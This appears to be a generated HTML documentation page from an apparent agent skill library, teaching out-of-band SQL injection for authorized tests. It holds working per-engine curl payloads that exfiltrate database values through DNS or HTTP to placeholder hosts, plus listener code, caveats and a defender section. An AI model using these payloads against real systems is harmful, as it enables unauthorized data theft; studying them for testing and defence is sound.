@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: sqli-out-of-band</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>sqli-out-of-band</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when blind SQL injection is confirmed but boolean and time</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="web-sqli.html">web-sqli</a></div><div class="deps"><span class="kind">requires:</span> <a href="web-sqli.html">web-sqli</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="network-pivoting.html">network-pivoting</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Python</td><td>3.12</td></tr><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>curl</td><td>8.5</td></tr></tbody></table><p>Out-of-band (OOB) SQL injection makes the database server itself send the answer to you, usually through a DNS lookup or an HTTP request that carries the stolen data in the hostname or URL. This skill covers OOB extraction for authorized tests: the DNS exfiltration primitives per engine, HTTP callback techniques, running your own listener, and encoding data so it survives the channel. Use it when blind extraction is confirmed too slow, and only when the rules of engagement allow the database to make outbound connections.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm the database host can resolve external names (test with a benign</li>
+<p>lookup to your listener first).</p>
+<li>Start your DNS or HTTP listener and verify you see the test callback.</li>
+<li>Pick the OOB primitive for the fingerprinted engine (UNC path, load_file,</li>
+<p>UTL_HTTP, xp_dirtree).</p>
+<li>Exfiltrate short values first (version, user) to validate the channel.</li>
+<li>Encode longer values (hex) and split them across multiple lookups to fit</li>
+<p>DNS label limits.</p>
+<li>Extract only the minimum data needed, then shut the listener down.</li>
+<li>Record every callback with timestamps for the report.</li>
+</ol>
+<h2>1. Listener setup</h2>
+<p>You need a server you control that logs incoming DNS queries or HTTP hits.</p>
+<pre><code class="language-bash"># Simple HTTP listener with Python stdlib (logs every hit)
+python3 -m http.server 8080 --bind 0.0.0.0 2&gt;&amp;1 | tee /tmp/oob_hits.log
+
+# DNS listener: use Burp Collaborator, or run a tiny UDP logger
+python3 - &lt;&lt;&#x27;EOF&#x27;
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.bind((&quot;0.0.0.0&quot;, 5353))
+print(&quot;[*] DNS listener on :5353&quot;)
+while True:
+    data, addr = s.recvfrom(512)
+    print(addr, data[:80])
+EOF</code></pre>
+<p>Burp Collaborator is the practical default: it gives you a unique domain and a polling interface, with no firewall work. Confirm the listener sees a manual <code>nslookup test.your-collaborator-domain</code> from your own machine before involving the target.</p>
+<h2>2. DNS exfiltration per engine</h2>
+<p>DNS labels hold 63 characters, so hex-encode data and split it.</p>
+<pre><code class="language-bash"># Microsoft SQL Server: xp_dirtree triggers a DNS lookup with data in the path
+# Hex of version string, chunked
+curl -s &quot;https://target.example/item?id=5%3BDECLARE%20@h%20varchar(1024)%3BSET%20@h%3D(SELECT%20master.dbo.fn_varbintohexstr(CAST(@@version%20AS%20varbinary)))%3BEXEC(&#x27;master..xp_dirtree%20&#x27;&#x27;\\\\&#x27;%2B@h%2B&#x27;.YOURDOMAIN&#x27;&#x27;&#x27;)--%20-&quot; -o /dev/null
+
+# Oracle: UTL_INADDR or DBMS_LDAP force resolution
+curl -s &quot;https://target.example/item?id=5%20AND%201%3DUTL_INADDR.GET_HOST_ADDRESS((SELECT%20user%20FROM%20dual)%7C%7C&#x27;.YOURDOMAIN&#x27;)--%20-&quot; -o /dev/null
+
+# MySQL: LOAD_FILE with a UNC path (Windows hosts only)
+curl -s &quot;https://target.example/item?id=5&#x27;%20AND%20LOAD_FILE(CONCAT(&#x27;\\\\\\\\&#x27;,(SELECT%20user()),&#x27;.YOURDOMAIN\\\\x&#x27;))--%20-&quot; -o /dev/null
+
+# PostgreSQL: COPY to a UNC path also resolves (Windows hosts)
+# or use dblink if the extension is installed</code></pre>
+<p>Watch the listener: each lookup arrives as <code>&lt;hexchunk&gt;.YOURDOMAIN</code>, which you decode back to text.</p>
+<pre><code class="language-bash"># Decode captured hex chunks
+python3 -c &quot;print(bytes.fromhex(&#x27;76312e302e31&#x27;).decode())&quot;</code></pre>
+<h2>3. HTTP callback exfiltration</h2>
+<p>When DNS is blocked but HTTP egress is open, make the database fetch a URL containing the data.</p>
+<pre><code class="language-bash"># Oracle UTL_HTTP: data goes in the URL path
+curl -s &quot;https://target.example/item?id=5%20AND%201%3DUTL_HTTP.REQUEST(&#x27;http://YOURSERVER:8080/&#x27;%7C%7C(SELECT%20user%20FROM%20dual))--%20-&quot; -o /dev/null
+
+# MSSQL: xp_cmdshell with curl only if the rules of engagement allow
+# command execution, which is a bigger step than data theft. Prefer DNS.
+
+# MySQL: no native HTTP primitive; chain through LOAD_FILE to an
+# HTTP-served SMB share is unreliable, so prefer DNS or fall back to blind.</code></pre>
+<p>Keep the listener log as evidence. Each hit line with its timestamp proves the exfiltration channel worked and shows exactly what was received.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The database server has no internet egress. OOB is impossible; confirm</li>
+<p>with a benign lookup test first and fall back to blind extraction instead of wasting the test window.</p>
+<li>DNS labels truncate at 63 characters. Chunk hex data into 60-character</li>
+<p>pieces and reassemble, or exfiltrate one column value per lookup.</p>
+<li>Special characters break the hostname. Hex-encode everything before</li>
+<p>embedding it in the lookup name.</p>
+<li>The collaborator domain is blocked by the target&#x27;s DNS filter. Use a</li>
+<p>fresh subdomain per test and keep the exfiltrated volume small.</p>
+<li>Oracle 11g+ restricts UTL packages by default. If the call fails with an</li>
+<p>access error, the DBA hardened it; do not try to escalate around it without explicit permission.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>DNS callbacks never arrive: verify egress with the benign test, check the</li>
+<p>listener is reachable from the internet (not just your LAN), and confirm no firewall rule on your side drops inbound UDP.</p>
+<li>Only some chunks arrive: the channel is lossy, so number your chunks</li>
+<p>(<code>1.&lt;hex&gt;.YOURDOMAIN</code>) and re-request the missing ones.</p>
+<li>The WAF blocks the OOB keywords (<code>xp_dirtree</code>, <code>UTL_HTTP</code>): try</li>
+<p>stacked-query framing or accept that blind extraction is the approved path for this target.</p>
+<li>You need full table data: OOB is a per-value channel, so extract keys</li>
+<p>first, then decide with the test lead whether the volume is justified.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see OOB exfiltration as DNS queries or HTTP requests from a database server to external domains, which is highly anomalous: database hosts should never browse the internet. DNS logs showing long hex subdomains, firewall logs showing database-to-internet connections, and database audit logs of <code>xp_dirtree</code> or <code>UTL_HTTP</code> calls are the key signals. The durable fix is egress filtering (databases get no internet route), disabling dangerous extended procedures and packages, and alerting on any outbound connection from a database tier.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application).</li>
+<li>MITRE ATT&amp;CK T1048 (Exfiltration Over Alternative Protocol).</li>
+<li>CWE-89 (Improper Neutralization of Special Elements used in an SQL</li>
+<p>Command, SQL Injection).</p>
+<li>OWASP Testing Guide: Testing for SQL Injection.</li>
+<li>PortSwigger Web Security Academy: Out-of-band SQL injection.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
